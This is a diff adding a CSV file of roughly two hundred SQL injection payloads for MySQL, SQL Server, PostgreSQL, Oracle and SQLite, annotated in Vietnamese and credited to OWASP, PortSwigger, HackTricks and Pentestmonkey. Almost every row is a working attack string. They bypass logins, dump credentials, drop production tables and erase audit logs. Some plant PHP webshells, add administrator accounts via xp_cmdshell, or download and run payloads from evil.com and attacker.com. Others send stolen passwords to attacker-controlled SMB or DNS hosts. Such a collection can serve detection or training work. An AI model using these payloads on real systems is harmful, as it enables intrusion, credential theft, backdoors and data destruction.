@@ -1,0 +1,200 @@
+payload,type,technique,dbms,severity,purpose,description,source
+ OR 1=1 -- -,In-band,UNION-based,MySQL,Trung bình,Truy cập trái phép,Bypass đăng nhập bằng cách luôn tạo điều kiện TRUE,OWASP SQL Injection Prevention Cheat Sheet
+"' UNION SELECT 1,2,3 -- -",In-band,UNION-based,MySQL,Trung bình,Truy cập trái phép,Xác định số cột trong bảng hiện tại,PortSwigger Web Security Academy
+"' UNION SELECT username, password FROM users -- -",In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Lấy tên đăng nhập và mật khẩu từ bảng users,OWASP Testing Guide v4
+"' UNION SELECT table_name, column_name FROM information_schema.columns -- -",In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Lấy thông tin về cấu trúc cơ sở dữ liệu,HackTricks SQL Injection Guide
+"' UNION SELECT 1, @@version -- -",In-band,UNION-based,MySQL,Trung bình,Truy cập trái phép,Lấy thông tin phiên bản của MySQL,SQL Injection Cheat Sheet by Invicti
+"' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) -- -",In-band,Error-based,MySQL,Cao,Truy cập trái phép,Sử dụng hàm EXTRACTVALUE để gây lỗi và hiển thị phiên bản DB,Pentestmonkey SQL Injection Cheat Sheet
+"' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -",In-band,Error-based,MySQL,Cao,Truy cập trái phép,Sử dụng lỗi GROUP BY để trích xuất thông tin,Netsparker SQL Injection Guide
+"' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1) -- -",In-band,Error-based,MySQL,Cao,Truy cập trái phép,Sử dụng hàm UPDATEXML để gây lỗi và hiển thị user hiện tại,OWASP SQL Injection Testing Guide
+' AND 1=1 -- -,Blind,Boolean-based,MySQL,Trung bình,Truy cập trái phép,Kiểm tra điều kiện boolean trả về TRUE,PortSwigger Web Security Academy
+' AND 1=2 -- -,Blind,Boolean-based,MySQL,Trung bình,Truy cập trái phép,Kiểm tra điều kiện boolean trả về FALSE,PortSwigger Web Security Academy
+"' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' -- -",Blind,Boolean-based,MySQL,Cao,Truy cập trái phép,Trích xuất ký tự đầu tiên của username,OWASP Testing Guide v4
+"' AND ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))=97 -- -",Blind,Boolean-based,MySQL,Cao,Truy cập trái phép,Kiểm tra mã ASCII của ký tự trong username,Pentestmonkey SQL Injection Cheat Sheet
+' AND SLEEP(5) -- -,Blind,Time-based,MySQL,Cao,Truy cập trái phép,Gây trì hoãn 5 giây để xác định lỗ hổng,Pentestmonkey SQL Injection Cheat Sheet
+"' AND IF(1=1, SLEEP(5), 0) -- -",Blind,Time-based,MySQL,Cao,Truy cập trái phép,Trì hoãn có điều kiện để xác nhận lỗ hổng,PortSwigger Web Security Academy
+"' AND (SELECT IF(MID(version(),1,1)='5',SLEEP(5),0)) -- -",Blind,Time-based,MySQL,Cao,Truy cập trái phép,Xác định phiên bản MySQL bằng kỹ thuật time-based,HackTricks SQL Injection Guide
+"' UNION SELECT LOAD_FILE(CONCAT('\\\\',user(),'.attackerdomain.com\\share\\file')) -- -",Out-of-band,UNION-based,MySQL,Cao,Truy cập trái phép,Cố gắng kết nối đến máy chủ ngoài để gửi dữ liệu đánh cắp,OWASP SQL Injection Testing Guide
+"'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin'),'.malicious.com\\share\\')) -- -",Out-of-band,UNION-based,MySQL,Cao,Truy cập trái phép,Trích xuất mật khẩu và gửi đến máy chủ ngoài,Pentestmonkey SQL Injection Cheat Sheet
+' OR 1=1 -- ,In-band,UNION-based,SQL Server,Trung bình,Truy cập trái phép,Bypass đăng nhập bằng cách luôn tạo điều kiện TRUE,OWASP SQL Injection Prevention Cheat Sheet
+"' UNION SELECT 1,2,3 -- ",In-band,UNION-based,SQL Server,Trung bình,Truy cập trái phép,Xác định số cột trong bảng hiện tại,PortSwigger Web Security Academy
+"' UNION SELECT username, password, 3 FROM users -- ",In-band,UNION-based,SQL Server,Cao,Truy cập trái phép,Lấy tên đăng nhập và mật khẩu từ bảng users,OWASP Testing Guide v4
+"' UNION SELECT name, NULL, NULL FROM sysobjects WHERE xtype='U' -- ",In-band,UNION-based,SQL Server,Cao,Truy cập trái phép,Liệt kê tất cả các bảng người dùng trong SQL Server,Pentestmonkey SQL Injection Cheat Sheet
+"' AND 1=CONVERT(int, (SELECT @@version)) -- ",In-band,Error-based,SQL Server,Cao,Truy cập trái phép,Gây lỗi chuyển đổi kiểu để hiển thị phiên bản SQL Server,Pentestmonkey SQL Server Injection Cheat Sheet
+"' AND 1=CONVERT(int, user_name()) -- ",In-band,Error-based,SQL Server,Cao,Truy cập trái phép,Gây lỗi chuyển đổi kiểu để hiển thị tên người dùng hiện tại,HackTricks SQL Injection Guide
+' AND (SELECT COUNT(*) FROM sysusers)>0 -- ,Blind,Boolean-based,SQL Server,Cao,Truy cập trái phép,Xác định số lượng người dùng trong hệ thống,PortSwigger Web Security Academy
+' AND (SELECT COUNT(*) FROM sysobjects WHERE name LIKE 'user%')>0 -- ,Blind,Boolean-based,SQL Server,Cao,Truy cập trái phép,Xác định có bảng nào liên quan đến người dùng hay không,HackTricks SQL Injection Guide
+' OR 1=1 --,In-band,UNION-based,PostgreSQL,Trung bình,Truy cập trái phép,Bypass đăng nhập bằng cách luôn tạo điều kiện TRUE,OWASP SQL Injection Prevention Cheat Sheet
+"' UNION SELECT 1,2,3 --",In-band,UNION-based,PostgreSQL,Trung bình,Truy cập trái phép,Xác định số cột trong bảng hiện tại,PortSwigger Web Security Academy
+"' UNION SELECT username, password, NULL FROM users --",In-band,UNION-based,PostgreSQL,Cao,Truy cập trái phép,Lấy tên đăng nhập và mật khẩu từ bảng users,OWASP Testing Guide v4
+' AND 1=CAST((SELECT version()) AS INTEGER) --,In-band,Error-based,PostgreSQL,Cao,Truy cập trái phép,Gây lỗi chuyển đổi kiểu để hiển thị phiên bản PostgreSQL,Pentestmonkey PostgreSQL Injection Cheat Sheet
+' AND 1=CAST((SELECT current_user) AS INTEGER) --,In-band,Error-based,PostgreSQL,Cao,Truy cập trái phép,Gây lỗi chuyển đổi kiểu để hiển thị người dùng hiện tại,HackTricks SQL Injection Guide
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --,Blind,Boolean-based,PostgreSQL,Cao,Truy cập trái phép,Xác định số lượng bảng trong cơ sở dữ liệu,PortSwigger Web Security Academy
+"' AND SUBSTR((SELECT version()),1,1)='P' --",Blind,Boolean-based,PostgreSQL,Cao,Truy cập trái phép,Xác định chữ cái đầu tiên của phiên bản PostgreSQL,HackTricks SQL Injection Guide
+' AND (SELECT pg_sleep(5)) --,Blind,Time-based,PostgreSQL,Cao,Truy cập trái phép,Gây trì hoãn 5 giây để xác định lỗ hổng,Pentestmonkey PostgreSQL Injection Cheat Sheet
+' AND CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users --,Blind,Time-based,PostgreSQL,Cao,Truy cập trái phép,Xác định sự tồn tại của người dùng admin bằng kỹ thuật time-based,PortSwigger Web Security Academy
+' OR 1=1 --,In-band,UNION-based,Oracle,Trung bình,Truy cập trái phép,Bypass đăng nhập bằng cách luôn tạo điều kiện TRUE,OWASP SQL Injection Prevention Cheat Sheet
+"' UNION SELECT NULL,NULL,NULL FROM dual --",In-band,UNION-based,Oracle,Trung bình,Truy cập trái phép,Xác định số cột trong bảng hiện tại,PortSwigger Web Security Academy
+"' UNION SELECT username, password, NULL FROM all_users --",In-band,UNION-based,Oracle,Cao,Truy cập trái phép,Lấy tên đăng nhập và mật khẩu từ bảng all_users,OWASP Testing Guide v4
+"' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1)) --",In-band,Error-based,Oracle,Cao,Truy cập trái phép,Sử dụng lỗi CTXSYS để hiển thị phiên bản Oracle,Pentestmonkey Oracle Injection Cheat Sheet
+' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||USER||CHR(62))) FROM dual) --,In-band,Error-based,Oracle,Cao,Truy cập trái phép,Sử dụng lỗi XMLType để hiển thị người dùng hiện tại,HackTricks SQL Injection Guide
+' AND (SELECT COUNT(*) FROM all_tables)>0 --,Blind,Boolean-based,Oracle,Cao,Truy cập trái phép,Xác định số lượng bảng trong cơ sở dữ liệu,PortSwigger Web Security Academy
+"' AND SUBSTR((SELECT user FROM dual),1,1)='S' --",Blind,Boolean-based,Oracle,Cao,Truy cập trái phép,Xác định chữ cái đầu tiên của người dùng hiện tại,HackTricks SQL Injection Guide
+"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=0 --",Blind,Time-based,Oracle,Cao,Truy cập trái phép,Gây trì hoãn 5 giây để xác định lỗ hổng,Pentestmonkey Oracle Injection Cheat Sheet
+"' AND CASE WHEN (USER='SYSTEM') THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END=0 --",Blind,Time-based,Oracle,Cao,Truy cập trái phép,Xác định người dùng hiện tại là SYSTEM bằng kỹ thuật time-based,PortSwigger Web Security Academy
+' OR 1=1 --,In-band,UNION-based,SQLite,Trung bình,Truy cập trái phép,Bypass đăng nhập bằng cách luôn tạo điều kiện TRUE,OWASP SQL Injection Prevention Cheat Sheet
+"' UNION SELECT 1,2,3 --",In-band,UNION-based,SQLite,Trung bình,Truy cập trái phép,Xác định số cột trong bảng hiện tại,PortSwigger Web Security Academy
+"' UNION SELECT name, sql, NULL FROM sqlite_master --",In-band,UNION-based,SQLite,Cao,Truy cập trái phép,Lấy tên và cấu trúc của các bảng trong SQLite,OWASP Testing Guide v4
+' AND 1=CAST((SELECT sqlite_version()) AS INTEGER) --,In-band,Error-based,SQLite,Cao,Truy cập trái phép,Gây lỗi chuyển đổi kiểu để hiển thị phiên bản SQLite,HackTricks SQL Injection Guide
+' AND 1=RANDOMBLOB(1000000000) --,In-band,Error-based,SQLite,Cao,Truy cập trái phép,Gây lỗi do yêu cầu quá nhiều bộ nhớ,Pentestmonkey SQLite Injection Cheat Sheet
+' AND (SELECT COUNT(*) FROM sqlite_master)>0 --,Blind,Boolean-based,SQLite,Cao,Truy cập trái phép,Xác định số lượng bảng trong cơ sở dữ liệu,PortSwigger Web Security Academy
+"' AND SUBSTR((SELECT sqlite_version()),1,1)='3' --",Blind,Boolean-based,SQLite,Cao,Truy cập trái phép,Xác định chữ số đầu tiên của phiên bản SQLite,HackTricks SQL Injection Guide
+"' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) --",Blind,Time-based,SQLite,Cao,Truy cập trái phép,Gây trì hoãn bằng cách thực hiện tác vụ nặng,HackTricks SQL Injection Guide
+"' AND (SELECT CASE WHEN (1=1) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) ELSE 1 END) --",Blind,Time-based,SQLite,Cao,Truy cập trái phép,Gây trì hoãn có điều kiện để xác nhận lỗ hổng,PortSwigger Web Security Academy
+'; DROP DATABASE test; -- -,In-band,UNION-based,MySQL,Cao,Xóa dữ liệu,Xóa toàn bộ cơ sở dữ liệu test,OWASP SQL Injection Testing Guide
+'; DROP TABLE IF EXISTS admin; -- -,In-band,UNION-based,MySQL,Cao,Xóa dữ liệu,Xóa bảng admin nếu tồn tại,HackTricks SQL Injection Guide
+'; DROP DATABASE test; -- ,In-band,UNION-based,SQL Server,Cao,Xóa dữ liệu,Xóa toàn bộ cơ sở dữ liệu test,Pentestmonkey SQL Server Injection Cheat Sheet
+'; IF EXISTS(SELECT * FROM sysobjects WHERE name='admin') DROP TABLE admin; -- ,In-band,UNION-based,SQL Server,Cao,Xóa dữ liệu,Xóa bảng admin nếu tồn tại,HackTricks SQL Injection Guide
+"'; SELECT BIN_TO_UUID(UNHEX(SHA2('pwd',512))) INTO OUTFILE '/var/www/html/backdoor.php' -- -",In-band,UNION-based,MySQL,Cao,Thực thi lệnh hệ thống,Tạo file PHP có thể được sử dụng cho backdoor,OWASP SQL Injection Testing Guide
+'; SELECT '<?php echo(`cat /etc/passwd`);?>' INTO OUTFILE '/var/www/html/read_passwd.php' -- -,In-band,UNION-based,MySQL,Cao,Thực thi lệnh hệ thống,Tạo script PHP để đọc file /etc/passwd trên máy chủ,HackTricks SQL Injection Guide
+'; EXEC xp_cmdshell 'net user hacker P@ssw0rd /ADD && net localgroup Administrators hacker /ADD' -- ,In-band,UNION-based,SQL Server,Cao,Thực thi lệnh hệ thống,Thêm người dùng mới vào nhóm Administrators,Pentestmonkey SQL Server Injection Cheat Sheet
+'; EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://evil.com/backdoor.exe C:\backdoor.exe && C:\backdoor.exe' -- ,In-band,UNION-based,SQL Server,Cao,Thực thi lệnh hệ thống,Tải và thực thi file thực thi độc hại,HackTricks SQL Injection Guide
+'; UPDATE users SET email='attacker@evil.com' WHERE privilege='admin' -- -,In-band,UNION-based,MySQL,Cao,Sửa đổi dữ liệu,Thay đổi email của tất cả tài khoản admin,OWASP SQL Injection Testing Guide
+"'; UPDATE users SET email=CONCAT(username,'@evil.com') -- -",In-band,UNION-based,MySQL,Cao,Sửa đổi dữ liệu,Sửa đổi email của tất cả người dùng thành dạng username@evil.com,HackTricks SQL Injection Guide
+'; UPDATE users SET email='attacker@evil.com' WHERE privilege='admin' -- ,In-band,UNION-based,SQL Server,Cao,Sửa đổi dữ liệu,Thay đổi email của tất cả tài khoản admin,Pentestmonkey SQL Server Injection Cheat Sheet
+'; UPDATE users SET email=username+'@evil.com' -- ,In-band,UNION-based,SQL Server,Cao,Sửa đổi dữ liệu,Sửa đổi email của tất cả người dùng thành dạng username@evil.com,HackTricks SQL Injection Guide
+'; UPDATE users SET password='hacked' WHERE username='admin' AND 1=1; -- -,Blind,Boolean-based,MySQL,Cao,Sửa đổi dữ liệu,Thay đổi mật khẩu của admin với điều kiện boolean,OWASP SQL Injection Testing Guide
+'; UPDATE users SET is_admin=1 WHERE username='attacker' AND (SELECT 1 FROM dual WHERE 1=1); -- -,Blind,Boolean-based,MySQL,Cao,Sửa đổi dữ liệu,Nâng quyền người dùng 'attacker' thành admin với điều kiện boolean,HackTricks SQL Injection Guide
+'; UPDATE users SET password='hacked' WHERE username='admin' AND 1=1; -- ,Blind,Boolean-based,SQL Server,Cao,Sửa đổi dữ liệu,Thay đổi mật khẩu của admin với điều kiện boolean,Pentestmonkey SQL Server Injection Cheat Sheet
+'; UPDATE users SET is_admin=1 WHERE username='attacker' AND (SELECT 1 WHERE 1=1); -- ,Blind,Boolean-based,SQL Server,Cao,Sửa đổi dữ liệu,Nâng quyền người dùng 'attacker' thành admin với điều kiện boolean,HackTricks SQL Injection Guide
+"'; UPDATE users SET password='hacked' WHERE username='admin' AND IF(1=1, SLEEP(5), 0); -- -",Blind,Time-based,MySQL,Cao,Sửa đổi dữ liệu,Thay đổi mật khẩu của admin với điều kiện time-based,OWASP SQL Injection Testing Guide
+'; UPDATE users SET is_admin=1 WHERE username='attacker' AND (SELECT SLEEP(5)); -- -,Blind,Time-based,MySQL,Cao,Sửa đổi dữ liệu,Nâng quyền người dùng 'attacker' thành admin với điều kiện time-based,HackTricks SQL Injection Guide
+'; UPDATE users SET password='hacked' WHERE username='admin'; WAITFOR DELAY '0:0:5'; -- ,Blind,Time-based,SQL Server,Cao,Sửa đổi dữ liệu,Thay đổi mật khẩu của admin với điều kiện time-based,Pentestmonkey SQL Server Injection Cheat Sheet
+'; UPDATE users SET is_admin=1 WHERE username='attacker'; WAITFOR DELAY '0:0:5'; -- ,Blind,Time-based,SQL Server,Cao,Sửa đổi dữ liệu,Nâng quyền người dùng 'attacker' thành admin với điều kiện time-based,HackTricks SQL Injection Guide
+'; DELETE FROM users WHERE username!='admin' AND 1=1; -- -,Blind,Boolean-based,MySQL,Cao,Xóa dữ liệu,Xóa tất cả người dùng trừ admin với điều kiện boolean,OWASP SQL Injection Testing Guide
+' AND (SELECT TOP 1 name FROM sysobjects WHERE id=1)>'a' -- ,Blind,Boolean-based,SQL Server,Cao,Truy cập trái phép,Xác định chữ cái đầu tiên của tên đối tượng đầu tiên,Pentestmonkey SQL Server Injection Cheat Sheet
+"' UNION SELECT 1,2,LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE id=1),'.attackerdomain.com\\share\\')) -- -",Out-of-band,UNION-based,MySQL,Cao,Thực thi lệnh hệ thống,Trích xuất mật khẩu và gửi dữ liệu đến máy chủ của kẻ tấn công,OWASP SQL Injection Testing Guide
+'; SELECT ... INTO OUTFILE '\\\\attackerip\\share\\output.txt' -- -,Out-of-band,UNION-based,MySQL,Cao,Thực thi lệnh hệ thống,Xuất dữ liệu truy vấn đến chia sẻ SMB từ xa,HackTricks SQL Injection Guide
+'; EXEC master..xp_dirtree '\\attackerserver\share' -- ,Out-of-band,UNION-based,SQL Server,Cao,Thực thi lệnh hệ thống,Tạo kết nối SMB đến máy chủ của kẻ tấn công,Pentestmonkey SQL Server Injection Cheat Sheet
+'; DECLARE @q VARCHAR(8000);SET @q=CAST(0x4445434C415245204054207661726368617228363535333529204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C40432057484944 AS VARCHAR(8000));EXEC(@q); -- ,Out-of-band,UNION-based,SQL Server,Cao,Thực thi lệnh hệ thống,Thực thi mã T-SQL được mã hóa HEX để che giấu hành động,HackTricks SQL Injection Guide
+"' UNION SELECT 1,2,'<?php system($_GET[""cmd""]);?>' INTO OUTFILE '/var/www/html/cmd.php' -- -",In-band,UNION-based,MySQL,Cao,Thực thi lệnh hệ thống,Tạo webshell PHP đơn giản,Pentestmonkey MySQL Injection Cheat Sheet
+"' UNION SELECT 1,2,'<?php echo ""<pre>""; system($_REQUEST[""cmd""]); echo ""</pre>""; ?>' INTO OUTFILE '/var/www/html/shell.php' -- -",In-band,UNION-based,MySQL,Cao,Thực thi lệnh hệ thống,Tạo webshell PHP với định dạng đầu ra,OWASP SQL Injection Testing Guide
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- -,Blind,Time-based,MySQL,Cao,Truy cập trái phép,Gây trì hoãn 5 giây sử dụng subquery,Pentestmonkey MySQL Injection Cheat Sheet
+"' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5,SLEEP(5),0) -- -",Blind,Time-based,MySQL,Cao,Truy cập trái phép,Kiểm tra số lượng bảng trong database hiện tại,PortSwigger Web Security Academy
+"' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='a' -- -",Blind,Boolean-based,MySQL,Cao,Truy cập trái phép,Kiểm tra ký tự đầu tiên của bảng đầu tiên,HackTricks SQL Injection Guide
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%') -- -,Blind,Boolean-based,MySQL,Cao,Truy cập trái phép,Kiểm tra mật khẩu của admin bắt đầu bằng 'a',OWASP SQL Injection Testing Guide
+' AND 1=(SELECT 1/0 FROM sysobjects WHERE name='users') -- ,In-band,Error-based,SQL Server,Cao,Truy cập trái phép,Gây lỗi chia cho 0 nếu bảng users tồn tại,Pentestmonkey SQL Server Injection Cheat Sheet
+' AND 1=(SELECT CAST(db_name() AS int)) -- ,In-band,Error-based,SQL Server,Cao,Truy cập trái phép,Gây lỗi chuyển đổi kiểu để hiển thị tên database hiện tại,HackTricks SQL Injection Guide
+"' AND (SELECT 2*(IF((SELECT * FROM users LIMIT 1)='',1,0))*'') -- -",In-band,Error-based,MySQL,Cao,Truy cập trái phép,Sử dụng lỗi toán học để kiểm tra bảng users có dữ liệu,Pentestmonkey MySQL Injection Cheat Sheet
+"' AND (SELECT 2*(IF((SELECT * FROM information_schema.tables WHERE table_schema=database() AND table_name='users' LIMIT 1)='',1,0))*'') -- -",In-band,Error-based,MySQL,Cao,Truy cập trái phép,Sử dụng lỗi toán học để kiểm tra bảng users tồn tại,OWASP SQL Injection Testing Guide
+"'; INSERT INTO users (username, password, email, is_admin) VALUES ('hacker', 'p455w0rd', 'hacker@evil.com', 1) -- -",In-band,UNION-based,MySQL,Cao,Sửa đổi dữ liệu,Thêm tài khoản admin mới vào hệ thống,OWASP SQL Injection Testing Guide
+'; UPDATE users SET email='hacked@evil.com' -- -,In-band,UNION-based,MySQL,Cao,Sửa đổi dữ liệu,Thay đổi email của tất cả người dùng,HackTricks SQL Injection Guide
+"'; INSERT INTO users (username, password, email, admin_level) VALUES ('backdoor', 'h4ck3d', 'evil@hacker.com', 99) -- ",In-band,UNION-based,SQL Server,Cao,Sửa đổi dữ liệu,Thêm tài khoản người dùng với quyền cao nhất,Pentestmonkey SQL Server Injection Cheat Sheet
+'; UPDATE users SET admin_level=99 WHERE username='victim' -- ,In-band,UNION-based,SQL Server,Cao,Sửa đổi dữ liệu,Nâng cấp quyền của một người dùng cụ thể,HackTricks SQL Injection Guide
+'; DROP TABLE users -- -,In-band,UNION-based,MySQL,Cao,Xóa dữ liệu,Xóa hoàn toàn bảng users,OWASP SQL Injection Testing Guide
+'; DELETE FROM audit_log -- -,In-band,UNION-based,MySQL,Cao,Xóa dữ liệu,Xóa tất cả các bản ghi nhật ký kiểm toán,HackTricks SQL Injection Guide
+'; DROP TABLE audit_logs -- ,In-band,UNION-based,SQL Server,Cao,Xóa dữ liệu,Xóa hoàn toàn bảng audit_logs,Pentestmonkey SQL Server Injection Cheat Sheet
+'; TRUNCATE TABLE access_logs -- ,In-band,UNION-based,SQL Server,Cao,Xóa dữ liệu,Xóa toàn bộ nhật ký truy cập,HackTricks SQL Injection Guide
+"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a); UPDATE users SET password='hacked' WHERE id=1; -- -",Blind,Boolean-based,MySQL,Cao,Sửa đổi dữ liệu,Sử dụng lỗi GROUP BY để thực hiện cập nhật mật khẩu,OWASP SQL Injection Testing Guide
+' AND 1=1; UPDATE users SET password='pwned' WHERE username='admin' -- ,Blind,Boolean-based,SQL Server,Cao,Sửa đổi dữ liệu,Cập nhật mật khẩu của admin,Pentestmonkey SQL Server Injection Cheat Sheet
+"' UNION SELECT 1,2,'<?php include($_GET[""shell""]);?>' INTO OUTFILE '/var/www/html/backdoor.php' -- -",In-band,UNION-based,MySQL,Cao,Thực thi lệnh hệ thống,Tạo backdoor PHP để thực thi lệnh từ xa,Pentestmonkey MySQL Injection Cheat Sheet
+'; DROP DATABASE production; -- -,In-band,UNION-based,MySQL,Cao,Xóa dữ liệu,Xóa toàn bộ cơ sở dữ liệu production,OWASP SQL Injection Testing Guide
+"'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- ",In-band,UNION-based,SQL Server,Cao,Thực thi lệnh hệ thống,Kích hoạt xp_cmdshell để thực thi lệnh hệ thống,Pentestmonkey SQL Server Injection Cheat Sheet
+'; UPDATE users SET password='hacked' WHERE id=1; SELECT SLEEP(5); -- -,Blind,Time-based,MySQL,Cao,Sửa đổi dữ liệu,Cập nhật mật khẩu và gây trì hoãn để xác nhận thành công,OWASP SQL Injection Testing Guide
+'; DROP TABLE access_logs; WAITFOR DELAY '0:0:5'; -- ,Blind,Time-based,SQL Server,Cao,Xóa dữ liệu,Xóa bảng nhật ký truy cập và gây trì hoãn,Pentestmonkey SQL Server Injection Cheat Sheet
+' AND 1=1; DELETE FROM users WHERE id!=1; -- -,Blind,Boolean-based,MySQL,Cao,Xóa dữ liệu,Xóa tất cả người dùng trừ người dùng id=1,OWASP SQL Injection Testing Guide
+' AND 1=1 -- ,Blind,Boolean-based,SQL Server,Trung bình,Truy cập trái phép,Kiểm tra điều kiện boolean trả về TRUE,PortSwigger Web Security Academy
+' AND 1=2 -- ,Blind,Boolean-based,SQL Server,Trung bình,Truy cập trái phép,Kiểm tra điều kiện boolean trả về FALSE,PortSwigger Web Security Academy
+"' AND (SELECT SUBSTRING(name,1,1) FROM sysobjects WHERE id=1)='a' -- ",Blind,Boolean-based,SQL Server,Cao,Truy cập trái phép,Trích xuất ký tự đầu tiên của tên đối tượng,OWASP Testing Guide v4
+' WAITFOR DELAY '0:0:5' -- ,Blind,Time-based,SQL Server,Cao,Truy cập trái phép,Gây trì hoãn 5 giây để xác định lỗ hổng,Pentestmonkey SQL Server Injection Cheat Sheet
+' IF 1=1 WAITFOR DELAY '0:0:5' -- ,Blind,Time-based,SQL Server,Cao,Truy cập trái phép,Trì hoãn có điều kiện để xác nhận lỗ hổng,PortSwigger Web Security Academy
+"' IF (SELECT ASCII(SUBSTRING(@@version,1,1)))=53 WAITFOR DELAY '0:0:5' -- ",Blind,Time-based,SQL Server,Cao,Truy cập trái phép,Xác định phiên bản SQL Server bằng kỹ thuật time-based,HackTricks SQL Injection Guide
+'; UPDATE users SET password='hacked' WHERE username='admin' -- -,In-band,UNION-based,MySQL,Cao,Sửa đổi dữ liệu,Thay đổi mật khẩu của admin,OWASP SQL Injection Testing Guide
+'; UPDATE users SET is_admin=1 WHERE username='hacker' -- -,In-band,UNION-based,MySQL,Cao,Sửa đổi dữ liệu,Nâng cấp quyền của người dùng thành admin,HackTricks SQL Injection Guide
+'; UPDATE users SET password='hacked' WHERE username='admin' -- ,In-band,UNION-based,SQL Server,Cao,Sửa đổi dữ liệu,Thay đổi mật khẩu của admin trong SQL Server,Pentestmonkey SQL Server Injection Cheat Sheet
+'; DELETE FROM users WHERE username!='admin' -- -,In-band,UNION-based,MySQL,Cao,Xóa dữ liệu,Xóa tất cả người dùng trừ admin,OWASP SQL Injection Testing Guide
+'; TRUNCATE TABLE logs -- -,In-band,UNION-based,MySQL,Cao,Xóa dữ liệu,Xóa toàn bộ bảng logs,HackTricks SQL Injection Guide
+'; DELETE FROM users -- ,In-band,UNION-based,SQL Server,Cao,Xóa dữ liệu,Xóa toàn bộ bảng users,Pentestmonkey SQL Server Injection Cheat Sheet
+'; SELECT LOAD_FILE('/etc/passwd') -- -,In-band,UNION-based,MySQL,Cao,Thực thi lệnh hệ thống,Đọc file /etc/passwd trên hệ thống,Pentestmonkey MySQL Injection Cheat Sheet
+"'; SELECT '<?php system($_GET[""cmd""]); ?>' INTO OUTFILE '/var/www/html/shell.php' -- -",In-band,UNION-based,MySQL,Cao,Thực thi lệnh hệ thống,Tạo webshell PHP để thực thi lệnh hệ thống,HackTricks SQL Injection Guide
+'; EXEC xp_cmdshell 'net user hacker P@ssw0rd /add' -- ,In-band,UNION-based,SQL Server,Cao,Thực thi lệnh hệ thống,Thêm người dùng hacker vào hệ thống,Pentestmonkey SQL Server Injection Cheat Sheet
+"'; EXEC master..xp_cmdshell 'powershell -c ""IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')""' -- ",In-band,UNION-based,SQL Server,Cao,Thực thi lệnh hệ thống,Tải và thực thi script PowerShell từ xa,HackTricks SQL Injection Guide
+' -- -,In-band,UNION-based,MySQL,Thấp,Truy cập trái phép,Comment phần còn lại của truy vấn để xác định lỗ hổng,OWASP SQL Injection Testing Guide
+admin' -- -,In-band,UNION-based,MySQL,Thấp,Truy cập trái phép,Đăng nhập với tên 'admin' mà không cần mật khẩu,PortSwigger Web Security Academy
+' -- ,In-band,UNION-based,SQL Server,Thấp,Truy cập trái phép,Comment phần còn lại của truy vấn để xác định lỗ hổng,OWASP SQL Injection Testing Guide
+admin' -- ,In-band,UNION-based,SQL Server,Thấp,Truy cập trái phép,Đăng nhập với tên 'admin' mà không cần mật khẩu,PortSwigger Web Security Academy
+') OR ('1'='1,In-band,UNION-based,MySQL,Trung bình,Truy cập trái phép,Bypass đăng nhập trong trường hợp truy vấn có cấu trúc khác,OWASP SQL Injection Prevention Cheat Sheet
+1' ORDER BY 10 -- -,In-band,UNION-based,MySQL,Trung bình,Truy cập trái phép,Xác định số cột bằng ORDER BY,PortSwigger Web Security Academy
+1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() -- -,In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Liệt kê tất cả các bảng trong cơ sở dữ liệu hiện tại,HackTricks SQL Injection Guide
+"1' UNION SELECT NULL,NULL,NULL,CONCAT(table_schema,'.',table_name) FROM information_schema.tables -- -",In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Liệt kê tất cả các bảng trên tất cả cơ sở dữ liệu,Pentestmonkey MySQL Injection Cheat Sheet
+1; BACKUP DATABASE master TO DISK='\\attackerserver\share\backup.bak' -- ,In-band,UNION-based,SQL Server,Cao,Truy cập trái phép,Sao lưu cơ sở dữ liệu ra bên ngoài,Pentestmonkey SQL Server Injection Cheat Sheet
+1; SELECT * FROM master..sysdatabases -- ,In-band,UNION-based,SQL Server,Cao,Truy cập trái phép,Liệt kê tất cả các cơ sở dữ liệu,HackTricks SQL Injection Guide
+' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='mysql')>1 -- -,Blind,Boolean-based,MySQL,Cao,Truy cập trái phép,Xác nhận số lượng bảng trong schema mysql,PortSwigger Web Security Academy
